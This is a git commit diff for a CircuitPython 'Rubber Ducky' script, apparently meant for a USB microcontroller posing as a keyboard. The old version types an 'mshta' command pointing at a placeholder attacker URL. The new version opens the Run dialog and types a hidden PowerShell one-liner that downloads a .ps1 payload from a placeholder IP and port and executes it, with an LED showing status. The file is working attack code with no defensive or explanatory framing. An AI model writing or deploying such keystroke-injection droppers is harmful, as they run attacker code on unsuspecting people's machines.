e515469f4b05a719c6068cdb2fbb300183113282
Toshy-Shimura <82123083+Toshy-Shimura@users.noreply.github.com>
2023-08-14 23:10:43 -0300

    Update code.py

--- Rubber Ducky/code.py
+++ Rubber Ducky/code.py
@@ -1,22 +1,28 @@
-import time
-import os
-import usb_hid
+import time, os, usb_hid, board, digitalio
 from adafruit_hid.keycode import Keycode
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 
-URL = "URL DEL ATACANTE"
-time.sleep(10)
+led = digitalio.DigitalInOut(board.LED)
+led.direction = digitalio.Direction.OUTPUT
+keyboard = Keyboard(usb_hid.devices)
+layout = KeyboardLayoutUS(keyboard)
 
-if 'run' in os.listdir():
-    time.sleep(3)
-    keyboard = Keyboard(usb_hid.devices)
-    layout = KeyboardLayoutUS(keyboard)
+IP = "IP"
+PORT = "PORT"
+Payload = "PAYLOAD NAME.ps1"
 
-    keyboard.send(Keycode.WINDOWS, Keycode.R)
-    time.sleep(1)
-    layout.write("cmd\n")
+if 'run' in os.listdir():    
     time.sleep(2)
-    layout.write(f"mshta {URL}\n")
-    time.sleep(10)
-    keyboard.send(Keycode.ALT, Keycode.F4)
+    keyboard.send(Keycode.WINDOWS, Keycode.R)
+    time.sleep(2)
+    layout.write(f"""powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://{IP}:{PORT}/{Payload}');"\n""")
+    led.value = True
+    time.sleep(15)
+    led.value = False
+
+while not 'run' in os.listdir():
+    led.value = True
+    time.sleep(0.5)
+    led.value = False
+    time.sleep(0.5)
